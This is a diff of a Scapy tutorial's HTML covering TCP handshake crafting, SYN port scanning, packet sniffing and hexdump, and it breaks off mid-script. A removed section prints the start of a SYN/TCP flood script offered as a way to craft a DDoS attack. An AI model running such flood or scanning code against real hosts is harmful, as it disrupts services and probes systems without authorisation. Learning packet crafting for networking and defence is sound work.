-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp_ack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;12346&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp_ack&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;p&gt;5) we create a new instance of the TCP header &lt;strong&gt;ACK&lt;/strong&gt;, which now has the flag &lt;strong&gt;A&lt;/strong&gt; (placing the acknowledgment  value for the server there) and  we send everything out:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ACK = TCP(sport=1024, dport=80, flags=&amp;#39;A&amp;#39;, seq=12346, ack=ack)
+send(ip/ACK)
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;6)  Finally, we create the segment with no TCP flags or payload and send it back:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp_push&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;12346&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;p&gt;6)  Finally, we create the segment with no TCP flags and payload and send it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;PUSH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;12346&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ack&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;HELLO!&amp;quot;&lt;/span&gt;
-&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp_push&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;PUSH&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;However, running the snippet above will not work!&lt;/p&gt;
+&lt;p&gt;However, running the snippet above will not work.&lt;/p&gt;
 &lt;p&gt;The reason is that crafting TCP sessions with Scapy circumvents the native TCP/IP stack. Since the host is unaware that Scapy is sending packets, the native host would receive an unsolicited SYN/ACK that is not associated with any known open session/socket. This would result in the host reseting the connection when receiving the SYN/ACK.&lt;/p&gt;
-&lt;p&gt;One solution is to use the host's firewall with &lt;a href="http://en.wikipedia.org/wiki/Iptables"&gt;iptables&lt;/a&gt; to block the outbound resets. For example, to drop all outbound packets that are TCP and destined to IP 192.168.1.25 from 192.168.1.114, destination port 80, we  run:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo iptables -A OUTPUT -p tcp -d 192.168.1.25 -s 192.168.1.114 --dport 80 --tcp-flags RST -j DROP
+&lt;p&gt;One solution is to use the host's firewall with &lt;a href="http://en.wikipedia.org/wiki/Iptables"&gt;iptables&lt;/a&gt; to block the outbound resets. For example, to drop all outbound packets that are TCP and destined for IP 192.168.1.25 from 192.168.1.114 to destination port 80, examining the flag bits, we can run:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo iptables -A OUTPUT -p tcp -d 192.168.1.25 -s 192.168.1.114 --dport &lt;span class="m"&gt;80&lt;/span&gt; --tcp-flags RST -j DROP
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This does not prevent the source host from generating a reset each time it receives a packet from the session, however it does block it from silencing the resets.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Network Scanning and Sniffing&lt;/h2&gt;
-&lt;p&gt;Let's learn how to perform a simple &lt;strong&gt;port scanning&lt;/strong&gt;.  This can be crafted by sending a TCP/IP packet with the TCP flag set to SYM to every port in the range 1-1024 (this will take a couple of minutes to scan):&lt;/p&gt;
+&lt;p&gt;Now that we know the Scapy basics, let's learn how to perform a &lt;strong&gt;port scanning&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;A very simple scanner can be crafted by sending a TCP/IP packet with the TCP flag set to SYM to every port in the range 1-1024 (this will take a couple of minutes to scan):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;unans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;192.168.1.114&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -236,24 +243,23 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;For more advanced stuff, check out &lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources/blob/master/Network_and_802.11/scapy/super_scanner.py"&gt;my script for scanning subnet in selected ports&lt;/a&gt;.&lt;/p&gt;
 &lt;h3&gt;The Sniff() Method&lt;/h3&gt;
-&lt;p&gt;In Scapy, packet sniffing can be done with the function &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#sniffing"&gt;sniff()&lt;/a&gt;.  The &lt;strong&gt;iface&lt;/strong&gt; parameter tells the sniffer which network interface to sniff on. The &lt;strong&gt;count&lt;/strong&gt; parameter specifies how many packets we want to sniff (where a blank value is infinite). The &lt;strong&gt;timeout&lt;/strong&gt; parameter stop sniffing after a given time:&lt;/p&gt;
+&lt;p&gt;In Scapy, packet sniffing can be done with the function &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#sniffing"&gt;sniff()&lt;/a&gt;.  The &lt;strong&gt;iface&lt;/strong&gt; parameter tells the sniffer which network interface to sniff on. The &lt;strong&gt;count&lt;/strong&gt; parameter specifies how many packet we want to sniff (where a blank value is infinite):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;iface&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;eth1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We can specify filters too:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tcp and (port 25 or port 110)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; p = sniff(filter=&amp;quot;tcp and (port 25 or port 110)&amp;quot;)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We can also use &lt;strong&gt;sniff&lt;/strong&gt; with a  customized callback function to every packet that matches the filter, with the &lt;strong&gt;prn&lt;/strong&gt; parameter:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;def&lt;/span&gt; &lt;span class="n"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
-    &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 
-&lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;icmp&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;iface&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;eth1&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;icmp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;iface&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;eth1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -265,11 +271,11 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 
 &lt;hr /&gt;
 &lt;h2&gt;Changing a Routing Table&lt;/h2&gt;
-&lt;p&gt;To look at the routing table of our machine we use the Scapy's command &lt;strong&gt;conf.route&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;Network&lt;/span&gt;         &lt;span class="n"&gt;Netmask&lt;/span&gt;         &lt;span class="n"&gt;Gateway&lt;/span&gt;         &lt;span class="n"&gt;Iface&lt;/span&gt;           &lt;span class="n"&gt;Output&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;
-&lt;span class="mf"&gt;127.0.0.0&lt;/span&gt;       &lt;span class="mf"&gt;255.0.0.0&lt;/span&gt;       &lt;span class="mf"&gt;0.0.0.0&lt;/span&gt;         &lt;span class="n"&gt;lo&lt;/span&gt;              &lt;span class="mf"&gt;127.0.0.1&lt;/span&gt;
-&lt;span class="mf"&gt;0.0.0.0&lt;/span&gt;         &lt;span class="mf"&gt;0.0.0.0&lt;/span&gt;         &lt;span class="mf"&gt;192.168.1.1&lt;/span&gt;     &lt;span class="n"&gt;wlp1s0&lt;/span&gt;          &lt;span class="mf"&gt;192.168.1.114&lt;/span&gt;
-&lt;span class="mf"&gt;192.168.1.0&lt;/span&gt;     &lt;span class="mf"&gt;255.255.255.0&lt;/span&gt;   &lt;span class="mf"&gt;0.0.0.0&lt;/span&gt;         &lt;span class="n"&gt;wlp1s0&lt;/span&gt;          &lt;span class="mf"&gt;192.168.1.114&lt;/span&gt;
+&lt;p&gt;To look to the routing table of our machine we can just print the Scapy's command &lt;strong&gt;conf.route&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Network         Netmask         Gateway         Iface           Output IP
+127.0.0.0       255.0.0.0       0.0.0.0         lo              127.0.0.1
+0.0.0.0         0.0.0.0         192.168.1.1     wlp1s0          192.168.1.114
+192.168.1.0     255.255.255.0   0.0.0.0         wlp1s0          192.168.1.114
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -288,8 +294,8 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 &lt;h2&gt;Other Useful Stuff&lt;/h2&gt;
 &lt;h3&gt;Dumping Binary data in Hex form&lt;/h3&gt;
 &lt;p&gt;A very useful function  is &lt;a href="https://pypi.python.org/pypi/hexdump"&gt;hexdump()&lt;/a&gt;, which can be used to display one or more packets using classic hexdump format:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;scapy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
-&lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
 &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Ether&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;GET /index.html HTTP/1.1&amp;quot;&lt;/span&gt;
 &lt;span class="n"&gt;hexdump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -297,12 +303,12 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 
 &lt;p&gt;Running this snippet gives:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python example_hexdump.py
-WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination :: &lt;span class="o"&gt;(&lt;/span&gt;no default route?&lt;span class="o"&gt;)&lt;/span&gt;
-0000   00 90 A9 A3 F1 46 A4 17  31 E9 B3 27 08 00 45 00   .....F..1..&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;..E.
-0010   00 40 00 01 00 00 40 06  8D 0F C0 A8 01 72 4A 7D   .@....@......rJ&lt;span class="o"&gt;}&lt;/span&gt;
-0020   E1 10 00 14 00 50 00 00  00 00 00 00 00 00 50 02   .....P........P.
-0030   20 00 FA 15 00 00 47 45  54 20 2F 69 6E 64 65 78    .....GET /index
-0040   2E 68 74 6D 6C 20 48 54  54 50 2F 31 2E 31         .html HTTP/1.1
+WARNING: No route found &lt;span class="k"&gt;for&lt;/span&gt; IPv6 destination :: &lt;span class="o"&gt;(&lt;/span&gt;no default route?&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="m"&gt;0000&lt;/span&gt;   &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;90&lt;/span&gt; A9 A3 F1 &lt;span class="m"&gt;46&lt;/span&gt; A4 &lt;span class="m"&gt;17&lt;/span&gt;  &lt;span class="m"&gt;31&lt;/span&gt; E9 B3 &lt;span class="m"&gt;27&lt;/span&gt; &lt;span class="m"&gt;08&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;45&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;   .....F..1..&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;..E.
+&lt;span class="m"&gt;0010&lt;/span&gt;   &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;40&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;40&lt;/span&gt; &lt;span class="m"&gt;06&lt;/span&gt;  8D 0F C0 A8 &lt;span class="m"&gt;01&lt;/span&gt; &lt;span class="m"&gt;72&lt;/span&gt; 4A 7D   .@....@......rJ&lt;span class="o"&gt;}&lt;/span&gt;
+&lt;span class="m"&gt;0020&lt;/span&gt;   E1 &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;50&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt;  &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;50&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;   .....P........P.
+&lt;span class="m"&gt;0030&lt;/span&gt;   &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; FA &lt;span class="m"&gt;15&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;00&lt;/span&gt; &lt;span class="m"&gt;47&lt;/span&gt; &lt;span class="m"&gt;45&lt;/span&gt;  &lt;span class="m"&gt;54&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; 2F &lt;span class="m"&gt;69&lt;/span&gt; 6E &lt;span class="m"&gt;64&lt;/span&gt; &lt;span class="m"&gt;65&lt;/span&gt; &lt;span class="m"&gt;78&lt;/span&gt;    .....GET /index
+&lt;span class="m"&gt;0040&lt;/span&gt;   2E &lt;span class="m"&gt;68&lt;/span&gt; &lt;span class="m"&gt;74&lt;/span&gt; 6D 6C &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;48&lt;/span&gt; &lt;span class="m"&gt;54&lt;/span&gt;  &lt;span class="m"&gt;54&lt;/span&gt; &lt;span class="m"&gt;50&lt;/span&gt; 2F &lt;span class="m"&gt;31&lt;/span&gt; 2E &lt;span class="m"&gt;31&lt;/span&gt;         .html HTTP/1.1
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -320,96 +326,8 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We can use fuzzers for something more interesting. For example to craft a &lt;a href="http://en.wikipedia.org/wiki/Denial-of-service_attack"&gt;DDOS&lt;/a&gt; script. This is a very simple example I have in my repository:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt;
-&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
-&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;synFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;syn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
-    &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;syn&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verbose&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-
-&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;tcpFlood&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fuzz&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
